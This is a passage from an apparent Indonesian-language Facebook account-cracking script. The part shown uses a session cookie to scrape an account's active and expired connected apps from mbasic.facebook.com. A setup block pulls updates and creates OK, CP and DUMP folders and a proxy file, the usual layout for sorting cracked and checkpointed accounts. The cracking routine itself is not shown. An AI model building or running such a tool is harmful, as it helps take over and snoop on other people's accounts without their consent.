	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> Cowok_pink_13<<<<<#
